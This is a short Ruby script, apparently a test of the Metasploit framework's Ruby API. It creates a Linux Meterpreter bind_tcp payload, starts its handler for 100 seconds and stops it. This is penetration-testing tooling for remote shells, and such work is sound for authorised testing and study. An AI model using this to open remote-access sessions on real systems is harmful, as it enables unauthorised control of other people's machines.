require 'rubygems'

$LOAD_PATH.unshift File.expand_path(File.join(File.dirname(__FILE__),"..","..", "msf3", "msf3"))

require 'msf/base'

framework = Msf::Simple::Framework.create
payload = framework.payloads.create("linux/x86/meterpreter/bind_tcp")

payload.start_handler
sleep 100

payload.stop_handler
